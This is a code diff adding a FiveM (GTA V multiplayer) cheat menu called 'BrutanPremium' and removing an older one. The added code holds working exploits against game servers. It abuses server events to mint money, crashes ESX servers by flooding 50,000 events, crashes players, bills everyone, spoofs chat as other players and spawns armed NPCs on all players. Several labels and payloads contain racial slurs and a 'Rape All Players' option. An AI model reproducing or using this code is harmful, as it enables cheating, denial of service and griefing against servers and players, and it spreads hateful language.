+                if BrutanPremium.MenuButton    ("~r~→  ~s~Self Menu", "SelfMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Teleport Menu", "TeleportMenu") then
+				elseif BrutanPremium.MenuButton("~r~→  ~s~AI", "AI") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Online Players", "OnlinePlayersMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Menu", "WeaponMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Menu", "VehMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Extreme Menu", "MaliciousMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Menu", "TrollMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "ESXMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~VRP Options", "VRPMenu") then
+				elseif BrutanPremium.MenuButton("~r~→  ~s~Settings", "SettingsMenu") then
+                elseif BrutanPremium.Button("~r~→  ~s~~r~Close The Menu  ←") then
+                    Enabled = false
+                end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VRPMenu") then
+                if BrutanPremium.Button("VRP PayGarage 100$") then
+                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
+                elseif BrutanPremium.Button("VRP PayGarage 1000$") then
+                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
+                elseif BrutanPremium.Button("VRP PayGarage 10 000$") then
+                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
+                elseif BrutanPremium.Button("VRP PayGarage 100 000$") then
+                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
+                elseif BrutanPremium.Button("VRP Get Driver Licence") then
+                    TriggerServerEvent("dmv:success")
+				elseif BrutanPremium.Button("Give yourself 10x salary (VRP)") then
+				a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
+				a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
+                elseif BrutanPremium.Button("VRP Bank Deposit") then
+                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
+                    TriggerServerEvent("bank:deposit", amount)
+                elseif BrutanPremium.Button("VRP Bank Withdraw") then
+                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
+                    TriggerServerEvent("bank:withdraw", amount)
+                elseif BrutanPremium.Button("VRP Slot Machine") then
+                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
+                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
+                end
+
+                BrutanPremium.Display()
+			                elseif BrutanPremium.IsMenuOpened("SettingsMenu") then
+                if BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
+                    currentMenuX = currentIndex
+                    selectedMenuX = selectedIndex
+                    for i = 1, #allMenus do
+                        BrutanPremium.SetMenuX(allMenus[i], menuX[currentMenuX])
+                    end
+                    end) 
+                    then
+                elseif BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
+                    currentMenuY = currentIndex
+                    selectedMenuY = selectedIndex
+                    for i = 1, #allMenus do
+                        BrutanPremium.SetMenuY(allMenus[i], menuY[currentMenuY])
+                    end
+                    end)
+                    then
+                    elseif BrutanPremium.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
+					elseif BrutanPremium.MenuButton("~r~→  ~s~Information", "InfoMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Credits", "Credits") then
+                    end
+    
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("InfoMenu") then
+                    if BrutanPremium.Button("BrutanPremium") then
+					elseif BrutanPremium.Button("https://discord.gg/8nSCR6u") then
+                    end
+    
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("Credits") then
+				if     BrutanPremium.Button("~h~Press on our names <3") then
+				elseif BrutanPremium.Button("∑  ~r~~h~NEMESiS~s~ - ~r~DEV") then
+				drawNotification('~h~Contact him for More releases.')
+				drawNotification('~h~Also contact him if you want to purchase any menu.')
+				elseif BrutanPremium.Button("∑  ~r~~h~Real Nigg~s~ - ~r~DEV") then
+				elseif BrutanPremium.Button("∑  ~r~~h~Brutan~s~ - ~r~DEV") then
+				end
+					
+					BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("TrollMenu") then
+                if BrutanPremium.Button("ESX Server Crasher") then
+                    for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
+                elseif  BrutanPremium.CheckBox(
+                    "Send everyone to jail",
+                    banallusers,
+                    function(enabled)
+                    banallusers = enabled
+                    end)
+                then
+				elseif BrutanPremium.Button("Spawn moutain Lion On Everyone") then
+                    local mtlion = "A_C_MtLion"
+                    for i = 0, 128 do
+                        local co = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(mtlion))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(mtlion)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
                         end
-                    else
-                        local Entity =
-                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
-                            PlayerPedId(-1)
-                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                     end
-                elseif VladmirAK47.Button('~h~Teleport into his car') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)				 
-					 SetEntityCoords(ped, pos.x, pos.y, pos.z - 4)				 
-					 Citizen.Wait(100)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, 0)
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end	
-                elseif VladmirAK47.Button('~h~Revive ~s~Player') then
-                    local dU = 'PICKUP_HEALTH_STANDARD'
-                    local dV = GetHashKey(dU)
-                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
-                    SetPickupRegenerationTime(pickup, 60)
-                elseif VladmirAK47.Button('~h~Armour ~s~Player') then
-                    local dW = 'PICKUP_ARMOUR_STANDARD'
-                    local dX = GetHashKey(dW)
-                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    for i = 0, 99 do
-                        Citizen.Wait(0)
-                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
-                        SetPickupRegenerationTime(pickup, 10)
-                        i = i + 1
-                    end					
-                elseif VladmirAK47.Button('~h~Give All Weapons') then
-                    for i = 1, #b6 do
-                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
+				elseif BrutanPremium.Button("SWAT W/ Railgun On Everyone") then
+                    local swat = "s_m_y_swat_01"
+					local bR = "weapon_railgun"
+                    for i = 0, 128 do
+                        local coo = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(swat))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(swat)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetPedCanSwitchWeapon(ped, true)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(i)) then
+                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
                     end
-                elseif VladmirAK47.Button('~h~Remove All Weapons') then
-                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
-                elseif VladmirAK47.Button('~h~Give Vehicle') then
-                    local ped = GetPlayerPed(SelectedPlayer)
-                    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
-                    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
-                        RequestModel(cb)
-                        while not HasModelLoaded(cb) do
+                elseif BrutanPremium.Button("Nuke Server") then
+                    nukeserver()
+				elseif BrutanPremium.Button("Esx Destroy V2") then
+				    esxdestroyv2()
+				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
+                    local amount = KeyboardInput("Enter Amount", "", 100000000)
+                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
+                    if amount and name then
+                    for i = 0, 128 do
+                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
+                    end
+				end
+				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
+				for i = 0, 128 do
+                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Brutan Premium, BRUTAN ON YOUTUBE", "99999999")
+                end
+				elseif BrutanPremium.Button("VRP Destroy V2") then
+				    vrpdestroy()
+                elseif BrutanPremium.Button("Rape All Players") then
+                    RapeAllFunc()
+                elseif BrutanPremium.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
+                elseif BrutanPremium.Button('Make~s~ EVERYONE A Wall') then
+                    for i = 0, 128 do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'xs_prop_hamburgher_wl'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'xs_prop_hamburgher_wl'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+				elseif BrutanPremium.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
+                elseif BrutanPremium.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
+			    elseif BrutanPremium.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
+                elseif BrutanPremium.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
+                elseif BrutanPremium.Button("Crash All Players") then
+                    for i = 0, 128 do
+                        if not ped == GetPlayerPed(-1) then
+                            CrashPlayer(GetPlayerPed(i))
+                        end
+                    end
+                elseif BrutanPremium.Button("Fake Message") then
+                    local da=KeyboardInput("Enter player name","",100)
+                    if da then
+                        local ck=KeyboardInput("Enter message","",1000)
+                        if ck then
+                            TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
+                        end
+                    end
+                elseif BrutanPremium.Button("ESX Set All Police") then
+                    for i = 0, 128 do
+                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
+                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
+                    end
+                elseif BrutanPremium.Button("ESX Set All Mechanic") then
+                    for i = 0, 128 do
+                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
+                        TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
+                    end
+                end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("TeleportMenu") then
+                if BrutanPremium.Button("~b~TP~s~ To Your Waypoint") then
+                    TeleportToWaypoint()
+                elseif BrutanPremium.Button("~b~TP~s~ Into Nearest Vehicle") then
+                    teleportToNearestVehicle()
+                elseif BrutanPremium.Button("~b~TP~s~ To Coordinates") then
+                    TeleportToCoords()
+                elseif BrutanPremium.CheckBox(
+                    "Show Your Coordinates",
+                    showCoords,
+                    function(enabled)
+                        showCoords = enabled
+                    end)
+                then
+                end
+
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("AI") then
+			                if BrutanPremium.Button("~h~Configure The ~g~Speed") then
+                    cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
+					local c1 = 1.0
+					cspeed = tonumber(cspeed)
+					if cspeed == nil then
+											drawNotification(
+                            '~~r~Invalid Speed you dumbass~s~.'
+                        )
+                        drawNotification(
+                            '~r~Operation cancelled~s~.'
+                        )
+                    elseif cspeed then
+                        ojtgh = (cspeed .. ".0")
+                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
+                    end
+					
+                    SetDriverAbility(GetPlayerPed(-1), 100.0)
+                elseif BrutanPremium.Button("Drive to waypoint ~o~SLOW") then
+                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
+                        local blipIterator = GetBlipInfoIdIterator(8)
+                        local blip = GetFirstBlipInfoId(8, blipIterator)
+                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
+                        local ped = GetPlayerPed(-1)
+                        ClearPedTasks(ped)
+                        local v = GetVehiclePedIsIn(ped, false)
+                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, true)
+                        SetDriveTaskDrivingStyle(ped, 8388636)
+                        speedmit = true
+                    end
+                elseif BrutanPremium.Button("Drive to waypoint ~g~FAST") then
+                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
+                        local blipIterator = GetBlipInfoIdIterator(8)
+                        local blip = GetFirstBlipInfoId(8, blipIterator)
+                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
+                        local ped = GetPlayerPed(-1)
+                        ClearPedTasks(ped)
+                        local v = GetVehiclePedIsIn(ped, false)
+                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
+                        SetDriveTaskDrivingStyle(ped, 2883621)
+                        speedmit = true
+                    end
+                elseif BrutanPremium.Button("Wander Around") then
+                    local ped = GetPlayerPed(-1)
+                    ClearPedTasks(ped)
+                    local v = GetVehiclePedIsIn(ped, false)
+                    print("Configured speed is currently " .. ojtgh)
+                    TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
+                elseif BrutanPremium.Button("~h~~r~Stop AI") then
+                    speedmit = false
+                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
+                        ClearPedTasks(GetPlayerPed(-1))
+                    else
+                        ClearPedTasksImmediately(GetPlayerPed(-1))
+				    end
+				end
+				                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehMenu") then
+						if BrutanPremium.Button("Remote Car") then
+			RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
+			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
+			RCCar.Start()
+                    else
+                        drawNotification("~r~Model Isn't Valid You Tard")
+                    end
+              elseif BrutanPremium.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
+		 elseif BrutanPremium.Button("Spawn A Custom Vehicle") then
+                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
+                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
+                        RequestModel(ModelName)
+                        while not HasModelLoaded(ModelName) do
                             Citizen.Wait(0)
                         end
-                        local veh =
-                            CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
+
+                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
+                        if DelCurVeh then
+                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
+                            drawNotification("Vehicle Just Got Deleted")
+                        end
+                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
+					local playerPed = GetPlayerPed(-1)
+					local playerVeh = GetVehiclePedIsIn(playerPed, true)
+						SetVehicleNumberPlateText(playerVeh, "BRUTAN")
                     else
-                        av('~b~Model is not valid!', true)
+                        drawNotification("~r~Model Isn't Valid You Tard")
                     end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('SuperPowerOptions') then
-                if
-                    VladmirAK47.CheckBox(
-                        '~h~Stars',
-                        drug16,
-                        function(dR)
-                           drug16 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~New Year',
-                        Weed2,
-                        function(dR)
-                            Weed2 = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~The Joker',
-                        drug2,
-                        function(dR)
-                            drug2 = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Alein',
-                        drug3,
-                        function(dR)
-                            drug3 = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~SuperMan',
-                        drug5,
-                        function(dR)
-                            drug5 = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~GTEST',
-                        drug6,
-                        function(dR)
-                            drug6 = dR
-                        end
-                    )
-                 then				 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Iron Man',
-                        drug4,
-                        function(dR)
-                            drug4 = dR
-                        end
-                    )
-                 then				 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Seel',
-                        drug17,
-                        function(dR)
-                           drug17 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then	
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Deadly Waves',
-                        drug18,
-                        function(dR)
-                           drug18 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then	
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~The Flash',
-                        drug19,
-                        function(dR)
-                           drug19 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Smoke from the ass',
-                        drug20,
-                        function(dR)
-                           drug20 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Explosions',
-                        drug21,
-                        function(dR)
-                           drug21 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Small Flys',
-                        drug22,
-                        function(dR)
-                           drug22 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Moon',
-                        drug23,
-                        function(dR)
-                           drug23 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Electric Sound',
-                        drug24,
-                        function(dR)
-                           drug24 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Electric',
-                        drug25,
-                        function(dR)
-                           drug25 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Bullets from Neck',
-                        drug26,
-                        function(dR)
-                           drug26 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Power from Leg',
-                        drug27,
-                        function(dR)
-                           drug27 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Firework Sound',
-                        drug28,
-                        function(dR)
-                           drug28 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Fire work',
-                        drug29,
-                        function(dR)
-                           drug29 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-				 elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Fire from back',
-                        drug30,
-                        function(dR)
-                           drug30 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then				 
-                end				 
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('SoundOptions') then
-                if VladmirAK47.Button('~h~Death Sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test4 then
-                 test4 = true
-                        av('~h~~b~Death ON~.', false)
-                else
-                 test4 = false
-                        av('~h~~b~Death Off.', false)
-                end
-                elseif VladmirAK47.Button('~h~Hell Sound ') then
-				selectedPlayerId = SelectedPlayer
-                if not test998 then
-                 test998 = true
-                        av('~h~~b~Hell ON~.', false)
-                else
-                 test998 = false
-                        av('~h~~b~Hell Off.', false)
-                end				
-                elseif VladmirAK47.Button('~h~Taliban sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test991 then
-                 test991 = true
-                        av('~h~~b~Taliban ON~.', false)
-                else
-                 test991 = false
-                        av('~h~~b~Taliban Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~ISIS Sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test993 then
-                 test993 = true
-                        av('~h~~b~ISIS ON~.', false)
-                else
-                 test993 = false
-                        av('~h~~b~ISIS Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~AK47 Sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test999 then
-                 test999 = true
-                        av('~h~~b~Sound ON~.', false)
-                else
-                 test999 = false
-                        av('~h~~b~Sound Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~Water Sound') then
-				selectedPlayerId = SelectedPlayer
-                if not mysound then
-                 mysound = true
-                        av('~h~~b~Sound ON~.', false)
-                else
-                 mysound = false
-                        av('~h~~b~Sound Off.', false)
-                end					
-                elseif VladmirAK47.Button('~h~Steam Sound') then
-                        local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z - 2, 11, 99, true, false, 0.0)
-                elseif VladmirAK47.Button('~h~OMG Sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test3000 then
-                 test3000 = true
-                        av('~h~~b~ ON~.', false)
-                else
-                 test3000 = false
-                        av('~h~~b~ Off.', false)
-                end							
-                elseif VladmirAK47.Button('~h~EMP sound') then
-				selectedPlayerId = SelectedPlayer
-                if not test2998 then
-                 test2998 = true
-                        av('~h~~b~ ON~.', false)
-                else
-                 test2998 = false
-                        av('~h~~b~ Off.', false)
-                end
-				elseif VladmirAK47.Button('~h~Scream sounds') then
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                     RequestModel('mp_m_freemode_01')
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('mp_m_freemode_01'), pos.x, pos.y, pos.z - 2.8, true, true)	                                 							
-                                if DoesEntityExist(ped) then
-									 SetEntityVisible(ped, false, true)
-                                      SetPedKeepTask(ped)
-                                end	
-				elseif VladmirAK47.Button('~h~Hey sounds') then
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                     RequestModel('mp_m_freemode_01')
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('mp_m_freemode_01'), pos.x, pos.y, pos.z - 2.8, true, true)	                                 							
-                                if DoesEntityExist(ped) then
-                                     PlayAmbientSpeechWithVoice(ped, "WEPSEXPERT_GREETSHOPGEN", "WEPSEXP", "SPEECH_PARAMS_FORCE", 200)
-									 FreezeEntityPosition(ped, true)
-									 SetEntityVisible(ped, false, true)
-                                      SetPedKeepTask(ped)
-                                end					
-                end				
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('ObjectOptions') then
-                if VladmirAK47.Button('~h~USA FLAG') then
-				selectedPlayerId = SelectedPlayer
-                if not bird1 then
-                 bird1 = true
-                        av('~h~~p~ on~.', false)
-                else
-                 bird1= false
-                        av('~h~~b~Off.', false)
-                end
-				elseif VladmirAK47.Button('~h~Barrier') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2)  --prop_mp_barrier_02b
-				local bH1 = CreateObject(GetHashKey('prop_mp_barrier_02b'), oS.x, oS.y, oS.z, true, true, true)				
-				elseif VladmirAK47.Button('~h~Train') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2)  --prop_mp_barrier_02b
-				local bH1 = CreateObject(GetHashKey('freight'), oS.x, oS.y, oS.z + 2.3, true, true, true)
-				elseif VladmirAK47.Button('~h~Jet') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 			
-				local bH1 = CreateObject(GetHashKey('p_med_jet_01_s'), oS.x, oS.y, oS.z, true, true, true)	
-				FreezeEntityPosition(BH1, true)
-				elseif VladmirAK47.Button('~h~Couch') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('miss_rub_couch_01_l1'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)		
-				elseif VladmirAK47.Button('~h~Rock') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_rock_4_big2'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)	
-				elseif VladmirAK47.Button('~h~Soveit tank') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_rub_t34'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Tyre wall') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_tyre_wall_03b'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Tree') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_tree_birch_02'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Stunt Jump') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('stt_prop_stunt_jump15'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Soccer ball') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
